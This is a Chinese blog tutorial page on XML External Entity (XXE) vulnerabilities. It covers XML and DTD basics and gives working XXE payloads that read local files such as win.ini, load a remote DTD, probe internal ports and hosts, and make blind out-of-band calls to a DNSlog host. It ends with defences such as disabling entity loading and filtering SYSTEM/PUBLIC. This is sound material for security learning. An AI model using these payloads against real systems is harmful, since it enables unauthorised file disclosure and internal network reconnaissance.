<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>SRC | XXE漏洞 - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="SRC | XXE漏洞" />
<meta property="og:description" content="XML基础 概述 XML是一种用于标记电子文件使其具有结构性的可扩展标记语言。
XML是一种灵活的语言，类似于HTML语言，但是并没有固定的标签，所有标签都可以自定义，其设计的宗旨是传输数据，而不是像HTML一样显示数据。
文档结构 XML声明
DTD文档类型定义
文档元素
CDATA表示包含字符或者文本数据，这些文本将被解析器检查实体以及标记。被解析的字符数据不应当包含任意&amp;、&lt;、&gt;；需要使用它们的实体来替换
&amp;lt; &lt; 小于
&amp;gt; &gt; 大于
&amp;amp; &amp; 和号
&amp;apos; · 省略号
&amp;quot “ 引号
DTD基础 概述 DTD即文档类型定义，用来为XML文档定义语义约束
我们可以把DTD理解为一个模板，这个模板中定义了用户自己创建的根元素以及对应的子元素和根元素的合法子元素和属性
文档元素则必须以我们的DTD为模板，来对XML的元素的内容进行相应的规范化
DTD声明 内部声明
&lt;!DOCTYPE 根元素 [元素声明]&gt;
外部声明
&lt;!DOCTYPE 根元素 SYSTEM “文件名/URL”&gt;
DTD实体 内部普通实体
&lt;!ENTITY 实体名称 “实体的值”&gt;
外部普通实体
&lt;!ENTITY 实体名称 SYSTEM “URI”&gt;
&lt;!TINTITY 实体名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;
PUBLIC指公用DTD，其是某个权威机构指定，供特定行业或公司
SYSTEM是指该外部DYD文件是私有的，即我们自己创建的，没有公开发行，只是个人或在公司内部或者几个合作单位之间使用
公用DTD使用PUBLIC代替了原来的SYSTEM，并增加了DTD标识名
参数实体
内部 &lt;!ENTITY % 实体名称 “实体值”&gt;
外部 &lt;!ENTITY % 实体名称 SYSTEM “URI”&gt;" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/872e9bfdf494f9eb6294095efd0c2366/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-07-26T14:07:48+08:00" />
<meta property="article:modified_time" content="2023-07-26T14:07:48+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">SRC | XXE漏洞</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h2 style="margin-left:0;text-align:justify;"><strong>XML基础</strong></h2> 
<h3 style="margin-left:0;text-align:justify;"><strong>概述</strong></h3> 
<p style="margin-left:0;text-align:justify;">XML是一种用于标记电子文件使其具有结构性的可扩展标记语言。</p> 
<p style="margin-left:0;text-align:justify;">XML是一种灵活的语言，类似于HTML语言，但是并没有固定的标签，所有标签都可以自定义，其设计的宗旨是传输数据，而不是像HTML一样显示数据。</p> 
<h3 style="margin-left:0;text-align:justify;"><strong>文档结构</strong></h3> 
<p style="margin-left:0;text-align:justify;">XML声明</p> 
<p style="margin-left:0;text-align:justify;">DTD文档类型定义</p> 
<p style="margin-left:0;text-align:justify;">文档元素</p> 
<p style="margin-left:0;text-align:justify;"></p> 
<p style="margin-left:0;text-align:justify;"><img alt="" height="334" src="https://images2.imgbox.com/01/a9/lSRXYS8e_o.png" width="865"></p> 
<p></p> 
<p style="margin-left:0;text-align:justify;">CDATA表示包含字符或者文本数据，这些文本将被解析器检查实体以及标记。被解析的字符数据不应当包含任意&amp;、&lt;、&gt;；需要使用它们的实体来替换</p> 
<p style="margin-left:0;text-align:justify;">&amp;lt;         &lt;            小于</p> 
<p style="margin-left:0;text-align:justify;">&amp;gt;        &gt;            大于</p> 
<p style="margin-left:0;text-align:justify;">&amp;amp;    &amp;           和号</p> 
<p style="margin-left:0;text-align:justify;">&amp;apos;   ·             省略号</p> 
<p style="margin-left:0;text-align:justify;">&amp;quot    “             引号</p> 
<h2 style="margin-left:0;text-align:justify;"><strong>DTD基础</strong></h2> 
<h3 style="margin-left:0;text-align:justify;"><strong>概述</strong></h3> 
<p style="margin-left:0;text-align:justify;">DTD即文档类型定义，用来为XML文档定义语义约束</p> 
<p style="margin-left:0;text-align:justify;">我们可以把DTD理解为一个模板，这个模板中定义了用户自己创建的根元素以及对应的子元素和根元素的合法子元素和属性</p> 
<p style="margin-left:0;text-align:justify;">文档元素则必须以我们的DTD为模板，来对XML的元素的内容进行相应的规范化</p> 
<h3 style="margin-left:0;text-align:justify;"><strong>DTD声明</strong></h3> 
<p style="margin-left:0;text-align:justify;"><strong>内部声明</strong></p> 
<p style="margin-left:0;text-align:justify;">&lt;!DOCTYPE 根元素 [元素声明]&gt;</p> 
<p style="margin-left:0;text-align:justify;"></p> 
<p style="margin-left:0;text-align:justify;"><strong>外部声明</strong></p> 
<p style="margin-left:0;text-align:justify;">&lt;!DOCTYPE 根元素 SYSTEM “文件名/URL”&gt;</p> 
<p style="margin-left:0;text-align:justify;"></p> 
<p style="margin-left:0;text-align:justify;"></p> 
<h3 style="margin-left:0;text-align:justify;"><strong>DTD实体</strong></h3> 
<p style="margin-left:0;text-align:justify;"><strong>内部普通实体</strong></p> 
<p style="margin-left:0;text-align:justify;">&lt;!ENTITY 实体名称 “实体的值”&gt;</p> 
<p style="margin-left:0;text-align:justify;"></p> 
<p style="margin-left:0;text-align:justify;"><strong>外部普通实体</strong></p> 
<p style="margin-left:0;text-align:justify;">&lt;!ENTITY 实体名称 SYSTEM “URI”&gt;</p> 
<p style="margin-left:0;text-align:justify;">&lt;!TINTITY 实体名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</p> 
<p style="margin-left:0;text-align:justify;"></p> 
<p style="margin-left:0;text-align:justify;">PUBLIC指公用DTD，其是某个权威机构指定，供特定行业或公司</p> 
<p style="margin-left:0;text-align:justify;">SYSTEM是指该外部DYD文件是私有的，即我们自己创建的，没有公开发行，只是个人或在公司内部或者几个合作单位之间使用</p> 
<p style="margin-left:0;text-align:justify;">公用DTD使用PUBLIC代替了原来的SYSTEM，并增加了DTD标识名</p> 
<p style="margin-left:0;text-align:justify;"></p> 
<p style="margin-left:0;text-align:justify;"><strong>参数实体</strong></p> 
<p style="margin-left:0;text-align:justify;">内部       &lt;!ENTITY % 实体名称 “实体值”&gt;</p> 
<p style="margin-left:0;text-align:justify;">外部       &lt;!ENTITY % 实体名称   SYSTEM “URI”&gt;</p> 
<p style="margin-left:0;text-align:justify;"></p> 
<h2 style="margin-left:0;text-align:justify;"><strong>XXE漏洞</strong></h2> 
<h3 style="margin-left:0;text-align:justify;"><strong>概述</strong></h3> 
<p style="margin-left:0;text-align:justify;">XXE（XML External Entity）即XML外部实体注入攻击，发生在应用程序解 析XML输入时，没有禁止外部实体的加载，导致攻击者可以通过XML的外部实体获取服务器中本应被保护的数据。</p> 
<p style="margin-left:0;text-align:justify;"></p> 
<p style="margin-left:0;text-align:justify;">在文档类型定义部分，可以引用外部的DTD文件，所以这里容易出现安全问题。XML解析器解析外部实体时支持多种协议，如：使用file协议可以读取本地文件内容；使用http协议可以获取web资源等。因此攻击者可以构造恶意的外部实体，当解析器解析了包含恶意外部实体的XML类型文件时，便会导致XXE攻击。</p> 
<h3 style="margin-left:0;text-align:justify;"><strong>发现</strong></h3> 
<p style="margin-left:0;text-align:justify;">首先寻找接受XML作为输入内容的端点。</p> 
<p style="margin-left:0;text-align:justify;">可以通过修改HTTP的请求方法，修改Content—Type头部字段等等方法，然后看看应用程序的响应，看看程序是否解析了发送的内容，如果解析了，那么则可能有XXE攻击漏洞。</p> 
<p style="margin-left:0;text-align:justify;"></p> 
<p style="margin-left:0;text-align:justify;">如果站点解析xml，就可以尝试引用实体和DTD</p> 
<p style="margin-left:0;text-align:justify;"></p> 
<p style="margin-left:0;text-align:justify;">如果可以引用外部实体，则存在xxe漏洞.</p> 
<h2 style="margin-left:0;text-align:justify;"><strong>XXE利用</strong></h2> 
<h3 style="margin-left:0;text-align:justify;"><strong>读取任意文件</strong></h3> 
<p><img alt="" height="158" src="https://images2.imgbox.com/56/54/ZRyDHxGg_o.png" width="633"></p> 
<p></p> 
<pre><code class="language-XML">&lt;?xml version = "1.0"?&gt;

&lt;!DOCTYPE a [

&lt;!ENTITY b SYSTEM "file:///C:/Windows/win.ini"&gt;

]&gt;

&lt;c&gt;&amp;b;&lt;/c&gt;</code></pre> 
<p style="margin-left:0;text-align:justify;"></p> 
<p style="margin-left:0;text-align:justify;"><img alt="" height="367" src="https://images2.imgbox.com/0d/84/gTvWhhco_o.png" width="701"></p> 
<p></p> 
<p style="margin-left:0;text-align:justify;"></p> 
<h3 style="margin-left:0;text-align:justify;"><strong>引入外部实体</strong></h3> 
<p><img alt="" height="186" src="https://images2.imgbox.com/7f/32/j9xAWiZ4_o.png" width="605"></p> 
<p></p> 
<pre><code class="language-XML">&lt;?xml version = "1.0"?&gt;

&lt;!DOCTYPE a [

&lt;!ENTITY % d SYSTEM "http://127.0.0.1/xxe.dtd"&gt;

%d;

]&gt;

&lt;c&gt;&amp;b;&lt;/c&gt;</code></pre> 
<p style="margin-left:0;text-align:justify;"></p> 
<p style="margin-left:0;text-align:justify;"><img alt="" height="84" src="https://images2.imgbox.com/d5/33/7xnQ3zq8_o.png" width="678"></p> 
<p></p> 
<pre><code class="language-XML">&lt;!ENTITY b SYSTEM "file:///C:/Windows/win.ini"&gt;</code></pre> 
<p style="margin-left:0;text-align:justify;"></p> 
<p style="margin-left:0;text-align:justify;"><img alt="" height="367" src="https://images2.imgbox.com/74/b7/C4483zOZ_o.png" width="701"></p> 
<p></p> 
<p style="margin-left:0;text-align:justify;"></p> 
<h3 style="margin-left:0;text-align:justify;"><strong>探测内网端口</strong></h3> 
<pre><code class="language-XML">&lt;?xml version="1.0" encoding="UTF-8"?&gt;

&lt;!DOCTYPE foo [

&lt;!ELEMENT foo ANY &gt;

&lt;!ENTITY port SYSTEM "http://192.168.10.133"&gt;

]&gt;

&lt;x&gt;&amp;port;&lt;/x&gt;</code></pre> 
<p style="margin-left:0;text-align:justify;">端口存活，用时较短</p> 
<p style="margin-left:0;text-align:justify;"><img alt="" height="640" src="https://images2.imgbox.com/46/ad/Zieg1ZIH_o.png" width="865"></p> 
<p></p> 
<p style="margin-left:0;text-align:justify;"></p> 
<p style="margin-left:0;text-align:justify;">端口不存活，用时较长</p> 
<p style="margin-left:0;text-align:justify;"><img alt="" height="639" src="https://images2.imgbox.com/28/78/dGuHfkGU_o.png" width="865"></p> 
<p></p> 
<p style="margin-left:0;text-align:justify;"></p> 
<p style="margin-left:0;text-align:justify;">还可以探测内网主机存活</p> 
<p style="margin-left:0;text-align:justify;"></p> 
<p style="margin-left:0;text-align:justify;"><img alt="" height="641" src="https://images2.imgbox.com/f0/66/tIt30nDt_o.png" width="865"></p> 
<p></p> 
<h3 style="margin-left:0;text-align:justify;"><strong>Dnslog测试无回显</strong></h3> 
<pre><code class="language-XML">&lt;?xml version="1.0" encoding="UTF-8"?&gt;

&lt;!DOCTYPE ANY [

&lt;!ENTITY test SYSTEM "http://dnslogip"&gt; ]&gt;

&lt;x&gt;&amp;test;&lt;/x&gt;</code></pre> 
<p style="margin-left:0;text-align:justify;"><img alt="" height="303" src="https://images2.imgbox.com/3f/66/XAB1h1zU_o.png" width="865"></p> 
<p></p> 
<p style="margin-left:0;text-align:justify;"></p> 
<h2 style="margin-left:0;text-align:justify;"><strong>防御</strong></h2> 
<h3 style="margin-left:0;text-align:justify;"><strong><strong><span style="background-color:#ffffff;"><span style="color:#000000;">方案一、使用开发语言提供的禁用外部实体的方法</span></span></strong></strong></h3> 
<p style="margin-left:0;text-align:justify;">php:</p> 
<p style="margin-left:0;"><span style="background-color:#ffffff;"><span style="background-color:#ffffff;"><span style="color:#000000;">libxml_disable_entity_loader(true);</span></span><br><span style="color:#444444;">其他语言:</span></span></p> 
<p style="margin-left:0;"><span style="background-color:#ffffff;"><span style="background-color:#ffffff;"><span style="color:#000000;">https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet</span></span></span></p> 
<h3 style="margin-left:0;text-align:justify;"><strong><strong><span style="background-color:#ffffff;"><span style="color:#000000;">方案二、过滤用户提交的XML数据</span></span></strong></strong></h3> 
<p style="margin-left:0;text-align:justify;"><span style="background-color:#ffffff;"><span style="background-color:#ffffff;"><span style="color:#000000;">关键词：SYSTEM和PUBLIC。</span></span></span></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/8e79e1a838a7a281014843504604ec71/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">aws无账号下载的命令行</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/d64ae2421942307ec4e286fe0195c9cf/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">SRC | 逻辑漏洞原理及实战</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>